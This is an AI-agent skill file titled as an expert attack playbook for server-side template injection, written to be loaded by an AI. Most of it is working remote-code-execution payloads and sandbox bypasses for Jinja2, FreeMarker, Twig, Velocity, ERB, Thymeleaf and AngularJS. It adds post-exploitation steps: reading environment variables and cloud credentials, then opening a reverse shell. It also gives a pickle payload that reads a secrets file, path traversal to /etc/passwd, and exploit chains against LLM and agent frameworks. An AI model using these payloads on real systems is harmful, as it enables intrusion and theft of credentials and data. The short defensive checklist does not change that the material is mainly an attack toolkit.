---
name: ssti-server-side-template-injection
description: >-
  SSTI playbook. Use when template expressions, server-side rendering, preview features, or templating engines may evaluate attacker-controlled content.
---

# SKILL: Server-Side Template Injection (SSTI) — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert SSTI techniques. Covers polyglot detection probes, engine fingerprinting, Jinja2/FreeMarker/Twig/ERB RCE chains, client-side Angular SSTI, and bypass techniques. Base models often miss sandbox escape MRO chains and non-Jinja2 engines. For PHP CMS template eval, Jira SSTI, Confluence OGNL, and Spring Cloud Gateway SpEL, load the companion [SCENARIOS.md](./SCENARIOS.md).

## 0. RELATED ROUTING

Before using full engine-specific exploitation, you can first load:

- First use the polyglot probe sequence at the top of this file for low-noise fingerprinting
- [expression-language-injection](../expression-language-injection/SKILL.md) when `${7*7}` or `%{7*7}` resolves in Java (SpEL/OGNL) — different attack surface from template engines

### Extended Scenarios

Also load [SCENARIOS.md](./SCENARIOS.md) when you need:
- Maccms 8.x PHP template `eval` — `{if-A:phpinfo()}{endif-A}` in `vod-search`, base64 bypass for webshell write
- Jira CVE-2019-11581 — "Contact Administrators" form → Velocity template injection → command output in admin email
- Spring Cloud Gateway SpEL (CVE-2022-22947) — actuator route injection with `StreamUtils.copyToByteArray` for output capture
- Struts2 OGNL S2-045 (CVE-2017-5638) — Content-Type header OGNL injection with `_memberAccess` / `OgnlUtil` blacklist clear
- Confluence OGNL CVE-2021-26084 — `createpage-entervariables.action` with `\u0027` unicode bypass
- SSTI vs EL injection disambiguation guide
- Additional template engines: ASP.NET Razor, Elixir EEx, PHP Smarty/Latte/Blade, JS Pug/Handlebars/Nunjucks/EJS/Lodash + universal detection + blind SSTI + Flask PIN calculation

**SCENARIOS.md reference (§7–§11):** For expanded payloads and engine-specific notes on Razor, EEx/LEEx/HEEx, PHP stacks, JavaScript template engines, the universal polyglot probe, mathematical fingerprinting, blind SSTI (boolean / time / OOB), and Flask debug PIN prerequisites, see [SCENARIOS.md](./SCENARIOS.md). This skill keeps a short checklist in §13–§15.

### Engine Payloads Reference

For extended engine-specific fingerprinting, payload matrices (Jinja2, Twig, Freemarker, Velocity, Pebble, Mako, Slim, Handlebars, Thymeleaf, Smarty, ERB, Jade/Pug), and blind SSTI detection techniques (timing-based, DNS-based), see [ENGINE_PAYLOADS.md](./ENGINE_PAYLOADS.md).

### Universal detection & blind SSTI (pointer)

Use the polyglot payload and math probes in §1 and §13 first; when you need fuller blind-test patterns and per-engine examples (including non-Python stacks), follow [SCENARIOS.md](./SCENARIOS.md) §11 and cross-check §14 here for technique names (boolean, time, OOB, error-based).

---

## 1. DETECTION — POLYGLOT PROBE SEQUENCE

First test: distinguish SSTI from XSS. Send these probes and check if **math is evaluated** server-side:

```
{{7*7}}        → IF returns 49 (not {{7*7}}) → Jinja2 or Twig
${7*7}         → IF returns 49 → FreeMarker, Velocity, or Java EL
#{7*7}         → Ruby (ERB interpolation in strings)
<#assign x=7*7>${x}  → FreeMarker
@{7*7}         → Thymeleaf
*{7*7}         → Thymeleaf SpEL (*{...})
```

**Jinja2 vs Twig disambiguation**:
```
{{7*'7'}}
→ 7777777  = Jinja2 (Python string multiplication)
→ 49       = Twig (PHP numeric)
```

**Safe detection probe** (no math, just boolean):
```
{{''.__class__}}   → class 'str' = Python/Jinja2
```

---

## 2. ENGINE-TO-LANGUAGE MAPPING

| Template Engine | Language | Framework |
|---|---|---|
| Jinja2 | Python | Flask, FastAPI |
| Django Templates | Python | Django |
| Mako | Python | Pyramid |
| Twig | PHP | Symfony, Laravel |
| Smarty | PHP | Various |
| FreeMarker | Java | Spring MVC |
| Velocity | Java | Various Java |
| Pebble | Java | Various Java |
| Thymeleaf | Java | Spring Boot |
| ERB | Ruby | Rails |
| Slim / Haml | Ruby | Rails |
| Jade / Pug | Node.js | Express |
| Handlebars | Node.js | Express |
| Tornado | Python | Tornado |

Identifying language from errors → then narrow to template engine.

---

## 3. JINJA2 (PYTHON FLASK) — RCE CHAINS

### Chain 1: `os` module via `__globals__`
```python
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

### Chain 2: MRO subclass traversal (sandbox escape)
```python
# List all subclasses:
{{''.__class__.__mro__[1].__subclasses__()}}

# Find subprocess.Popen index (usually around 258-270, varies by Python version):
# Look for "subprocess.Popen" in the list

# Execute command (replace [258] with correct index):
{{''.__class__.__mro__[1].__subclasses__()[258]('id', shell=True, stdout=-1).communicate()[0]}}
```

### Chain 3: `request` object globals (works when `config` blocked)
```python
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
```
(Uses hex encoding to avoid `_` filtering)

### Chain 4: `lipsum` function globals (Flask built-in)
```python
{{lipsum.__globals__.os.popen('id').read()}}
```

### Chain 5: `cycler` object
```python
{{cycler.__init__.__globals__.os.popen('id').read()}}
```

### Finding correct subprocess index dynamically:
```python
# In injection:
{% for c in ''.__class__.__mro__[1].__subclasses__() %}
  {% if 'Popen' in c.__name__ %}
    {{loop.index}}
  {% endif %}
{% endfor %}
```

---

## 4. JINJA2 SANDBOX BYPASS TECHNIQUES

### When `_` (underscore) is blocked:
```python
# Use attr filter with hex encoding:
''|attr('\x5f\x5fclass\x5f\x5f')

# Use getattr via request object:
request|attr('args')|attr('__class__')
```

### When `.` (dot) is blocked:
```python
# Use [] subscript notation:
''['__class__']
config['SECRET_KEY']
```

### When keywords (class, mro) are blocked:
Use hex/unicode in `attr()`:
```python
|attr('\x5f\x5fclass\x5f\x5f')
|attr('\x5f\x5fm\x72\x6F\x5f\x5f')
```

### When output encoding strips HTML entities:
Use `|safe` filter to prevent auto-escaping.

---

## 5. FREEMARKER (JAVA) — RCE

### Execute Command via freemarker.template.utility.Execute
```freemarker
<#assign ex="freemarker.template.utility.Execute"?new()>
${ex("id")}
```

### Alternative via ObjectConstructor:
```freemarker  
<#assign ob="freemarker.template.utility.ObjectConstructor"?new()>
<#assign br=ob("java.io.BufferedReader",ob("java.io.InputStreamReader",ob("java.lang.Runtime")?api.exec("id").inputStream))>
${br.readLine()}
```

---

## 6. TWIG (PHP) — RCE

```php
// Twig 1.x (before sandbox):
{{_self.env.registerUndefinedFilterCallback("exec")}}
{{_self.env.getFilter("id")}}

// Twig 2.x using built-ins:
{{['id']|map('system')|join}}

// via filter map:
{{app.request.server.all|join(',')}}
```

---

## 7. VELOCITY (JAVA) — RCE

```velocity
#set($str=$class.inspect("java.lang.Runtime").method.invoke($class.inspect("java.lang.Runtime").type, null))
#set($run=$str.exec("id"))
#set($out=$run.inputStream)
```

Or more directly:
```velocity
#set($class=$currentNode.getClass())
#set($rt=$class.forName("java.lang.Runtime"))
#set($proc=$rt.getMethod("exec",$class.forName("java.lang.String")).invoke($rt.getMethod("getRuntime").invoke(null),"id"))
```

---

## 8. ERB (RUBY RAILS) — RCE

```ruby
<%= system('id') %>
<%= `id` %>
<%= IO.popen('id').read %>
<%= File.read('/etc/passwd') %>
```

---

## 9. THYMELEAF (JAVA SPRING) — RCE

Thymeleaf with Spring EL (SpEL):
```java
// In th:text or th:fragment context:
__${T(java.lang.Runtime).getRuntime().exec("id")}__::type

// Fragment expression context:
__${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(new String[]{"/bin/sh","-c","id"}).getInputStream())}__::type
```

---

## 10. CLIENT-SIDE TEMPLATE INJECTION (AngularJS)

When AngularJS is used client-side and user data flows into template expressions:

```javascript
// AngularJS 1.x sandbox escape:
{{constructor.constructor('alert(1)')()}}

// 1.5.x:
{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}

// 1.3.x:
{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}
```

**Detection**: send `{{1+1}}` — if page shows `2`, AngularJS evaluates expressions in the DOM.

---

## 11. SSTI → FULL RCE PATH

```
SSTI detected → identify engine
├── Jinja2 → config.__globals__['os'].popen() 
│           OR subclass traversal for Popen
├── FreeMarker → freemarker.template.utility.Execute?new()
├── Twig → _self.env.registerUndefinedFilterCallback('exec')
├── Velocity → java.lang.Runtime.exec()
├── ERB → <%= `cmd` %>
├── Thymeleaf → T(java.lang.Runtime).getRuntime().exec()
└── Angular CSTI → constructor.constructor('payload')()
```

**Post-RCE pivot**:
1. Read `/proc/self/environ` — env vars with credentials
2. Read application config files — DB passwords, API keys
3. `cat ~/.aws/credentials` — cloud credentials
4. Reverse shell for persistence

---

## 12. COMMON INJECTION ENTRY POINTS

Where user data enters templates:
- URL path: `https://site.com/home?name={{7*7}}`
- Query parameters: `?message=Hello`
- HTML forms: profile name, bio, content fields
- Error pages: `404 Not Found: /PAYLOAD`
- Email templates: name in password reset emails
- Inline template rendering: `render_template_string(user_input)`

**Most dangerous**: `render_template_string()` in Flask — entire user input used as template.

---

## 13. UNIVERSAL DETECTION PAYLOADS

**Polyglot probe** that triggers errors or evaluation in many engines:

```
${{<%[%'"}}%\.
```

**Mathematical probes** for blind/error confirmation:

```
{{7*7}}          → 49 (Jinja2, Twig, Nunjucks, Handlebars)
${7*7}           → 49 (FreeMarker, Velocity, EL, Thymeleaf)
<%= 7*7 %>       → 49 (ERB, EJS, EEx)
#{7*7}           → 49 (Pug, Ruby interpolation)
@(7*7)           → 49 (Razor)
{7*7}            → 49 (Smarty)
```

**Error-based engine fingerprint** (parser/stack traces often name the engine):

```
(1/0).zxy.zxy
```

---

## 14. BLIND SSTI TECHNIQUES

- **Boolean-based**: Compare `(3*4/2)` vs `3*)2(/4` — if the first resolves and the second errors, evaluation is likely
- **Time-based**: `{{sleep(5)}}` or the engine-specific equivalent for delay
- **OOB**: DNS/HTTP callback via template expressions when direct output is not visible
- **Error-based**: Force different error messages based on true/false conditions

---

## 15. FLASK PIN CALCULATION

When Flask **debug mode** (Werkzeug debugger) is exposed but **PIN-protected**, the PIN is derived from host-specific values. Typical inputs for public PIN calculation scripts:

1. **`username`** — from `/etc/passwd` (the user running the Flask process)
2. **Module name** — often `flask.app` or `Flask`
3. **Application path** — `app.py` or the real main filename
4. **MAC address** — e.g. `/sys/class/net/eth0/address`, converted to decimal as Werkzeug expects
5. **Machine ID** — `/etc/machine-id`, or `/proc/sys/kernel/random/boot_id` combined with the first line of `/proc/self/cgroup` per Werkzeug’s algorithm
6. **Compute PIN** — use established open-source PIN calculators that implement the same algorithm from these values

> Use only on systems you are authorized to test; obtaining these values implies prior access or an additional info-disclosure vector.

---

## 16. 2026 EMERGING TECHNIQUES

### LLM Serving Frameworks — The 2026 SSTI Main Battleground

LLM serving frameworks treat "prompt templates as code", rendering user-controlled content in a non-sandboxed Jinja2 `Environment`. This is the dominant new SSTI vector class — the template engine runs attacker-controlled model metadata as executable code.

### RAGFlow CVE-2026-45312 (CVSS 9.9, 2026-05-09)

`rag/prompts/generator.py` creates a sandbox-disabled Jinja2 environment:

```python
PROMPT_JINJA_ENV = jinja2.Environment(
    autoescape=False, trim_blocks=True, lstrip_blocks=True
)  # NOT SandboxedEnvironment
```

`citation_prompt()` extracts text from a user-controlled Canvas workflow DSL `<CITATION_GUIDELINES>` XML tag and renders it directly via `from_string()`. Self-registration is enabled by default, so a low-privilege account can reach the sink. Exploit chain:

```text
1. Register a low-priv account (self-registration enabled)
2. Create a Canvas workflow DSL embedding a <CITATION_GUIDELINES> block
   containing a Jinja2 sandbox-escape payload
3. Trigger citation generation -> PROMPT_JINJA_ENV.from_string(payload).render()
4. Sandbox escape idiom -> os.popen('id') as root
```

### SGLang CVE-2026-5760 (CVSS 9.8, 2026-04-20) — RCE via Poisoned GGUF

`get_jinja_env()` uses a standard `jinja2.Environment()` instead of `ImmutableSandboxedEnvironment` to render chat templates. The GGUF model file's `tokenizer.chat_template` field stores a raw Jinja2 template string. An attacker embeds an SSTI payload in a malicious GGUF, publishes it to HuggingFace, and the payload fires when a request hits the `/v1/rerank` endpoint. **No official patch** — the maintainer did not respond to CERT/CC and CISA coordination.

### LiteLLM SSTI RCE + Unicode Sandbox Bypass

Template injection accesses Python built-ins through Jinja2 internal objects:

```python
{{ cycler.__init__.__globals__["os"].popen("id").read() }}
```

`cycler` is a Jinja2 built-in; traversing `__init__.__globals__` reaches `os` without touching the application namespace.

### Agenta LLMOps CVE-2026-27952 / 27961

Evaluator pipelines use non-sandboxed `Template(content).render()` with attacker-influenced `content`, yielding direct RCE.

### Ecosystem Pattern

The same "trust model metadata" flaw recurs across the stack: `llama-cpp-python` (CVE-2024-34359 "Llama Drama"), vLLM (CVE-2025-61620). The root cause is treating model metadata as trusted content rather than executable code.

### 2026 Sandbox-Escape Essentials

```text
DO    use SandboxedEnvironment / ImmutableSandboxedEnvironment
      (blocks dunder attribute + dangerous callable access)
DO NOT use Environment().from_string(user_input)
DO NOT render tokenizer.chat_template / GGUF metadata in a plain Environment

Sandbox escape payload (illustrative - blocked by ImmutableSandboxedEnvironment):
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

### LangChain / LangGraph PromptTemplate Injection (2026 CVE Cluster)

LangChain is the dominant LLM orchestration framework (52M+ weekly PyPI downloads). Its `PromptTemplate` system evaluates f-string expressions during formatting, creating an SSTI-like surface when template content is attacker-influenced.

**CVE-2026-40087 (CVSS 9.8)** — LangChain f-string prompt-template validation bypass. `DictPromptTemplate` and `ImagePromptTemplate` accepted f-string templates containing attribute access or indexing expressions (`{user.__class__.__init__.__globals__}`) and evaluated them during formatting without validation. An attacker who can influence the template string (via API, config injection, or RAG retrieval) achieves Python expression evaluation:

```python
# Vulnerable: DictPromptTemplate evaluates f-string expressions
from langchain_core.prompts import DictPromptTemplate

# Attacker-controlled template string (e.g., from API input or RAG document):
template = {
    "system": "You are {user.__class__.__init__.__globals__['os'].popen('id').read()}"
}
prompt = DictPromptTemplate.from_template(template)
# .format() evaluates the expression → RCE
result = prompt.format(user="test")
```

**CVE-2026-34070 (CVSS 7.5)** — Path traversal in `PromptTemplate.from_file()`. The `template_path` is concatenated with a hard-coded base directory without validation:

```python
# Exploit: read arbitrary files via path traversal
POST /v1/prompts/load
{"template_path": "../../../../etc/passwd", "variables": {}}
# → returns /etc/passwd contents as "template"
```

**CVE-2026-4539** — PromptTemplate sanitize prompts patch. LangChain quietly released a security fix adding prompt sanitization. Pre-patch, `PromptTemplate` rendered raw user input as f-string templates, enabling injection. The fix adds `sanitize_prompts()` validation, but many deployments remain unpatched.

### LangGraph Checkpoint Deserialization → SSTI Chain (CVE-2026-34071 / 34072)

LangGraph persists agent state to SQLite checkpoints (`graph_state.db`). Two CVEs chain into full data exfiltration:

```text
Chain: CVE-2026-34070 (path traversal) → CVE-2026-34071 (pickle RCE) → CVE-2026-34072 (checkpoint dump)

1. Path traversal reads LangGraph checkpoint file path
2. Pickle deserialization in cache layer executes __reduce__ payload:
   class Evil:
       def __reduce__(self):
           return (os.system, ("cat /run/secrets/api_key",))
3. SQLite checkpoint dump extracts full conversation history:
   sqlite3 /mnt/volumes/graph_state.db "SELECT * FROM messages;"
```

**CVE-2025-68664 (CVSS 9.3)** — Serialization injection enabling prompt injection → RCE escalation. Attacker leverages prompt injection to trigger deserialization of attacker-controlled objects, extracting environment variables and instantiating trusted internal classes.

### Multi-Modal Template Injection (ImagePromptTemplate)

LangChain's `ImagePromptTemplate` processes image URLs as template variables. When the URL is attacker-controlled and the template string is not sanitized, the image URL can carry template expressions:

```python
# Vulnerable: ImagePromptTemplate with attacker-controlled URL
template = {
    "image_url": "{user_input}",  # user_input = "{{os.popen('id').read()}}"
    "text": "Describe this image"
}
# The f-string evaluation in format() executes the template expression
```

This is particularly dangerous because image URLs are often treated as "safe data" and not subjected to template sanitization.

### AI Agent Framework Template Injection Patterns

Beyond LangChain, other agent frameworks exhibit similar template-as-code flaws:

| Framework | Vulnerable Component | Mechanism | Impact |
|---|---|---|---|
| **LangChain** | `PromptTemplate.from_template()` | f-string expression evaluation | Python expression eval → RCE |
| **LangGraph** | Checkpoint deserialization | `pickle.loads()` on state data | Arbitrary code execution |
| **DSPy** | `dspy.Predict()` signature templates | Jinja2-like template in signature | Template injection |
| **AutoGen** | Agent system message templates | f-string in system prompt construction | Python eval via template |
| **CrewAI** | Task description templates | String formatting with agent context | Injection via task input |
| **Haystack** | Pipeline node templates | Jinja2 template in prompt node | SSTI via pipeline config |

### Blind SSTI in AI Pipelines

In AI/LLM pipelines, SSTI output is often consumed by the model rather than returned to the user directly, making traditional detection unreliable. Use these blind techniques:

**Time-based**: Inject `{{ __import__('time').sleep(10) }}` — if the LLM response takes 10+ seconds longer, template evaluation is confirmed.

**OOB via model output manipulation**: Inject instructions that cause the model to include a canary string in its response:

```text
{{ __import__('os').environ.get('SECRET_KEY', 'NOT_FOUND') }}
```

If the model's response contains the environment variable value, the template was evaluated server-side before being sent to the LLM.

**Error-based**: Inject invalid expressions and observe if the error message (reflected in model output or logs) reveals the template engine:

```text
{{ undefined_variable_xyz123 }}
→ "KeyError: 'undefined_variable_xyz123'" confirms Jinja2 evaluation
```

### 2026 AI Template Injection Detection Checklist

```text
□ Test all LLM API endpoints that accept prompt templates with {{7*7}}
□ Check LangChain PromptTemplate.from_file() for path traversal (../../etc/passwd)
□ Test DictPromptTemplate / ImagePromptTemplate with f-string expressions
□ Verify LangGraph checkpoint files are not accessible via path traversal
□ Check if pickle caching is enabled (allow_pickle should be False)
□ Test DSPy/AutoGen/CrewAI agent message templates for expression evaluation
□ Send time-based payloads ({{ time.sleep(10) }}) to detect blind SSTI in AI pipelines
□ Check if model metadata (GGUF chat_template, system prompts) is rendered as templates
□ Verify that RAG-retrieved documents are not used as template strings
□ Test multi-modal template inputs (image URLs, audio transcripts) for template injection
```
